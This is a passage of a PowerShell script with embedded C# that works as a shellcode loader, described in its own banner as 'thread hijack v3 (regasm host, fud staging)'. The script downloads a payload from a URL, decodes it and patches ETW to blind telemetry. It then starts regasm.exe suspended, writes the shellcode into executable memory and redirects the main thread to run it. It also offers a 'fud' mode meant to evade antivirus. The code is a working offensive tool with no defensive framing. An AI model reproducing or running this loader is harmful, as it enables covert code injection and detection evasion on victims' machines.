            IntPtr remote = IntPtr.Zero;
            for (int i = 0; i < hints.Length && remote == IntPtr.Zero; i++)
            {
                remote = VirtualAllocEx(pi.hProcess, (IntPtr)hints[i], new UIntPtr((ulong)len),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
            if (remote == IntPtr.Zero)
                throw new Exception("VirtualAllocEx failed: Win32=" + Marshal.GetLastWin32Error());

            if (targetBits == 32 && remote.ToInt64() > uint.MaxValue)
                throw new Exception("Allocated page is outside the 32-bit window: 0x" +
                                    remote.ToInt64().ToString("X"));

            UIntPtr written;
            if (!WriteProcessMemory(pi.hProcess, remote, shellcode, new UIntPtr((ulong)len), out written)
                || written.ToUInt64() != (ulong)len)
            {
                throw new Exception("WriteProcessMemory failed/short: Win32=" + Marshal.GetLastWin32Error() +
                                    " written=" + written.ToUInt64());
            }
            FlushInstructionCache(pi.hProcess, remote, new UIntPtr((ulong)len));

            Result r = new Result();
            r.Pid = pi.dwProcessId;
            r.Tid = pi.dwThreadId;
            r.RemoteBase = remote.ToInt64();
            r.Arch = (targetBits == 32 ? "x86" : "x64") + (useWow64Api ? "/wow64" : "");

            // Landing is resolved inside Hijack from the thread's own entry
            // pointer, which is guaranteed to live inside ntdll.
            long original;
            Hijack(pi.hProcess, pi.hThread, targetBits, useWow64Api, remote, IntPtr.Zero, r, out original);
            r.OriginalIp = original;

            long readBack;
            r.Verified = TryReadIp(pi.hThread, targetBits, useWow64Api, out readBack);
            r.ReadBackIp = readBack;
            if (r.Verified && readBack != remote.ToInt64())
            {
                throw new Exception("Context read-back mismatch: ip=0x" + readBack.ToString("X") +
                                    " expected=0x" + remote.ToInt64().ToString("X"));
            }

            uint suspension = ResumeThread(pi.hThread);
            if (suspension == 0xFFFFFFFF)
                throw new Exception("ResumeThread failed: Win32=" + Marshal.GetLastWin32Error());

            if (waitMs >= 0)
            {
                uint signaled = WaitForSingleObject(pi.hProcess, (uint)waitMs);
                if (signaled == 0)
                {
                    uint code;
                    if (GetExitCodeProcess(pi.hProcess, out code))
                    {
                        r.Waited = true;
                        r.ExitCode = unchecked((int)code);
                    }
                }
            }

            return r;
        }
        finally
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    // -----------------------------------------------------------------------
    // Read context, rebuild the entry frame a thread start would have given the
    // payload, point ip at it, write it back. Assumes the thread is suspended.
    //
    // A CreateRemoteThread thread enters its routine through a CALL, so esp is
    // 12 mod 16 at entry. The loader leaves this thread's context 16-aligned,
    // which breaks shellcode using aligned SSE loads. Shift esp down into the
    // free stack area and push the landing stub as the return address.
    // -----------------------------------------------------------------------
    static void Hijack(IntPtr hProcess, IntPtr hThread, int bits, bool wow64Api,
                       IntPtr target, IntPtr landing, Result r, out long original)
    {
        if (bits == 32)
        {
            IntPtr raw = Marshal.AllocHGlobal(CTX32_SIZE + 16);
            IntPtr ctx = new IntPtr((raw.ToInt64() + 15) & ~15L);
            try
            {
                for (int i = 0; i < CTX32_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, 0, unchecked((int)CONTEXT_i386_FULL));

                if (!GetCtx(hThread, wow64Api, ctx))
                    throw new Exception("GetThreadContext(x86) failed: Win32=" + Marshal.GetLastWin32Error());

                original = (long)(uint)Marshal.ReadInt32(ctx, CTX32_EIP);

                if (landing == IntPtr.Zero)
                    landing = ResolveLanding(hProcess, original, 32, r);

                if (landing != IntPtr.Zero)
                {
                    int esp = Marshal.ReadInt32(ctx, CTX32_ESP);
                    if (esp != 0)
                    {
                        int newEsp = (esp & unchecked((int)0xFFFFFFF0)) - 4;
                        WriteDword(hProcess, newEsp, unchecked((uint)landing.ToInt64()), "x86 return slot");
                        Marshal.WriteInt32(ctx, CTX32_ESP, newEsp);
                        r.OldEsp = (long)(uint)esp;
                        r.NewEsp = (long)(uint)newEsp;
                    }
                }

                Marshal.WriteInt32(ctx, CTX32_EIP, unchecked((int)target.ToInt64()));

                if (!SetCtx(hThread, wow64Api, ctx))
                    throw new Exception("SetThreadContext(x86) failed: Win32=" + Marshal.GetLastWin32Error());
            }
            finally { Marshal.FreeHGlobal(raw); }
        }
        else
        {
            IntPtr raw = Marshal.AllocHGlobal(CTX64_SIZE + 16);
            IntPtr ctx = new IntPtr((raw.ToInt64() + 15) & ~15L);
            try
            {
                for (int i = 0; i < CTX64_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, CTX64_FLAGS, unchecked((int)CONTEXT_AMD64_FULL));

                if (!GetThreadContext(hThread, ctx))
                    throw new Exception("GetThreadContext(amd64) failed: Win32=" + Marshal.GetLastWin32Error());

                original = Marshal.ReadInt64(ctx, CTX64_RIP);

                if (landing == IntPtr.Zero)
                    landing = ResolveLanding(hProcess, original, 64, r);

                if (landing != IntPtr.Zero)
                {
                    long rsp = Marshal.ReadInt64(ctx, CTX64_RSP);
                    if (rsp != 0)
                    {
                        long newRsp = (rsp & -16L) - 8;
                        WriteQword(hProcess, newRsp, landing.ToInt64(), "x64 return slot");
                        Marshal.WriteInt64(ctx, CTX64_RSP, newRsp);
                        r.OldEsp = rsp;
                        r.NewEsp = newRsp;
                    }
                }

                Marshal.WriteInt64(ctx, CTX64_RIP, target.ToInt64());

                if (!SetThreadContext(hThread, ctx))
                    throw new Exception("SetThreadContext(amd64) failed: Win32=" + Marshal.GetLastWin32Error());
            }
            finally { Marshal.FreeHGlobal(raw); }
        }
    }

    // Re-read the context and confirm the instruction pointer landed on the
    // payload. Returns false only if the read itself fails (not fatal).
    static bool TryReadIp(IntPtr hThread, int bits, bool wow64Api, out long ip)
    {
        ip = 0;
        if (bits == 32)
        {
            IntPtr raw = Marshal.AllocHGlobal(CTX32_SIZE + 16);
            IntPtr ctx = new IntPtr((raw.ToInt64() + 15) & ~15L);
            try
            {
                for (int i = 0; i < CTX32_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, 0, unchecked((int)CONTEXT_i386_FULL));
                if (!GetCtx(hThread, wow64Api, ctx)) return false;
                ip = (long)(uint)Marshal.ReadInt32(ctx, CTX32_EIP);
                return true;
            }
            finally { Marshal.FreeHGlobal(raw); }
        }
        else
        {
            IntPtr raw = Marshal.AllocHGlobal(CTX64_SIZE + 16);
            IntPtr ctx = new IntPtr((raw.ToInt64() + 15) & ~15L);
            try
            {
                for (int i = 0; i < CTX64_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, CTX64_FLAGS, unchecked((int)CONTEXT_AMD64_FULL));
                if (!GetThreadContext(hThread, ctx)) return false;
                ip = Marshal.ReadInt64(ctx, CTX64_RIP);
                return true;
            }
            finally { Marshal.FreeHGlobal(raw); }
        }
    }

    static bool GetCtx(IntPtr hThread, bool wow64Api, IntPtr ctx)
    {
        return wow64Api ? Wow64GetThreadContext(hThread, ctx) : GetThreadContext(hThread, ctx);
    }

    static bool SetCtx(IntPtr hThread, bool wow64Api, IntPtr ctx)
    {
        return wow64Api ? Wow64SetThreadContext(hThread, ctx) : SetThreadContext(hThread, ctx);
    }
}
'@

if (-not ('ThLoader' -as [type])) {
    Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
}

function Write-Info {
    param([string]$Tag, [string]$Text, [ConsoleColor]$Color = [ConsoleColor]::Gray)
    Write-Host ("[$Tag] $Text") -ForegroundColor $Color
}

# ---------------------------------------------------------------------------
# Payload acquisition
# ---------------------------------------------------------------------------
function Get-PayloadBytes {
    param([string]$Url, [string]$Path, [switch]$ForceB64)

    if ($Path) {
        $full = (Resolve-Path -LiteralPath $Path).Path
        Write-Info '*' "source   : $full (local)"
        $raw = [IO.File]::ReadAllBytes($full)
    }
    else {
        Write-Info '*' "source   : $Url"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        try {
            $raw = $wc.DownloadData($Url)
            $ctype = [string]$wc.ResponseHeaders['Content-Type']
        }
        catch {
            $ex = $_.Exception
            $msg = if ($ex.InnerException) { $ex.InnerException.Message } else { $ex.Message }
            throw "download failed: $msg"
        }
        finally { $wc.Dispose() }
        if ($ctype -match 'text/html') {
            throw "server returned HTML ($ctype) instead of a payload"
        }
        Write-Info '*' ("http     : {0} bytes, content-type '{1}'" -f $raw.Length, $ctype)
    }

    $bytes = $raw
    $looksB64 = $false
    if ($raw.Length -gt 0) {
        $text = [Text.Encoding]::ASCII.GetString($raw)
        $clean = $text -replace '\s', ''
        if ($clean.Length -ge 64 -and ($clean.Length % 4) -eq 0 -and $clean -match '^[A-Za-z0-9+/]+={0,2}$') {
            $looksB64 = $true
        }
    }

    if ($ForceB64 -or $looksB64) {
        $clean = ([Text.Encoding]::ASCII.GetString($raw)) -replace '\s', ''
        try { $bytes = [Convert]::FromBase64String($clean) }
        catch { throw "base64 decode failed: $($_.Exception.Message)" }
        Write-Info '*' ("decoded  : base64 -> {0} bytes" -f $bytes.Length)
    }

    if ($bytes.Length -lt 1) { throw 'payload is empty' }

    $sha = [Security.Cryptography.SHA256]::Create()
    try { $hash = -join ($sha.ComputeHash($bytes) | ForEach-Object { $_.ToString('x2') }) }
    finally { $sha.Dispose() }

    $previewCount = [Math]::Min(8, $bytes.Length)
    $preview = ($bytes[0..($previewCount - 1)] | ForEach-Object { $_.ToString('x2') }) -join ' '

    Write-Info '*' ("payload  : {0} bytes  sha256 {1}" -f $bytes.Length, $hash)
    Write-Info '*' ("first    : {0}" -f $preview)

    return ,$bytes
}

function Resolve-HostPath {
    param([string]$Path, [string]$Arch)

    if ($Path) {
        if (-not (Test-Path -LiteralPath $Path)) { throw "host not found: $Path" }
        return (Resolve-Path -LiteralPath $Path).Path
    }

    $framework = if ($Arch -eq 'x64') { 'Framework64' } else { 'Framework' }
    $candidates = @(
        (Join-Path $env:windir "Microsoft.NET\$framework\v4.0.30319\regasm.exe"),
        (Join-Path $env:windir "Microsoft.NET\$framework\v2.0.50727\regasm.exe")
    )

    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate) { return (Resolve-Path -LiteralPath $candidate).Path }
    }
    throw "no $Arch regasm.exe found under Microsoft.NET\$framework; pass -TargetPath"
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
Write-Host ''
Write-Info '*' 'loader   : thread hijack v3  (regasm host, fud staging)'

if (-not $NoEtw) {
    try {
        $etw = [ThLoader]::PatchEtw()
        Write-Info '+' "etw      : $etw"
    }
    catch {
        Write-Info '!' ("etw      : patch failed - {0}" -f $_.Exception.Message)
    }
}
else {
    Write-Info '!' 'etw      : skipped (-NoEtw)'
}

$bytes  = Get-PayloadBytes -Url $Url -Path $PayloadPath -ForceB64:$ForceBase64
$target = Resolve-HostPath -Path $TargetPath -Arch $HostArch
Write-Info '*' "host     : $target"
Write-Info '*' "hostarch : $HostArch (regasm must match shellcode bitness)"
if ($Plain) {
    Write-Info '*' 'mode     : plain (RWX payload, v2 path)'
}
else {
    Write-Info '*' ("mode     : fud (xor ciphertext in RW, {0} ms delay, then RX)" -f $DelayMs)
}

if ($DryRun) {
    Write-Info '!' 'dry-run  : payload and host validated; nothing spawned'
    return
}

$waitMs = -1
if ($WaitSeconds -gt 0) { $waitMs = $WaitSeconds * 1000 }
elseif ($GraceMs -gt 0) { $waitMs = $GraceMs }

Write-Info '*' 'spawn    : creating host suspended ...'

try {
    if ($Plain) { $r = [ThLoader]::Run($target, $bytes, $waitMs) }
    else        { $r = [ThLoader]::RunFud($target, $bytes, $waitMs, $DelayMs) }
}
catch {
    Write-Host ''
    Write-Info '!' ("FAILED   : {0}" -f $_.Exception.Message) -Color Red
    throw
}

if (-not $Plain -and $r.Mode -eq 'plain') {
    Write-Info '!' 'fud      : prerequisites unavailable; fell back to plain staging'
}

Write-Info '+' ("pid      : {0}  (primary tid {1})" -f $r.Pid, $r.Tid)
Write-Info '+' ("arch     : {0}" -f $r.Arch)
Write-Info '+' ("sc base  : 0x{0:X}" -f $r.RemoteBase)
if ($r.Mode -eq 'fud') {
    Write-Info '+' ("stub     : 0x{0:X} (RX poll stub)   flag 0x{1:X}" -f $r.StubBase, $r.FlagBase)
}
if ($r.LandingKind -ne 'none') {
    Write-Info '+' ("entry    : esp 0x{0:X} -> 0x{1:X}  ret->0x{2:X} ({3})" -f $r.OldEsp, $r.NewEsp, $r.Landing, $r.LandingKind)
}
else {
    Write-Info '!' 'entry    : stack handoff unavailable; raw context used'
}
$firstTarget = if ($r.Mode -eq 'fud') { $r.StubBase } else { $r.RemoteBase }
Write-Info '+' ("hijack   : ip 0x{0:X} -> 0x{1:X}" -f $r.OriginalIp, $firstTarget)

if ($r.Verified) {
    Write-Info '+' ("readback : 0x{0:X}  (matches)" -f $r.ReadBackIp)
}
else {
    Write-Info '!' 'readback : context read failed after set (continuing)'
}

Write-Info '+' 'resumed  : primary thread released'

if ($r.Waited) {
    $hex = '{0:X8}' -f $r.ExitCode
    $hint = switch ($hex) {
        '00000000' { 'clean exit' }
        'C0000005' { 'access violation' }
        'C000001D' { 'illegal instruction' }
        'C000000B' { 'bad image format' }
        'C0000135' { 'dependency missing' }
        'C0000409' { 'security cookie / CFG violation' }
        '80000003' { 'breakpoint' }
        '4000001F' { 'WOW64 breakpoint' }
        default    { '' }
    }
    $suffix = if ($hint) { "  ($hint)" } else { '' }
    Write-Info '+' ("exit     : 0x{0}{1}" -f $hex, $suffix)
}
elseif ($waitMs -ge 0) {
    Write-Info '+' ("alive    : host still running after {0} ms" -f $waitMs)
}

Write-Host ''
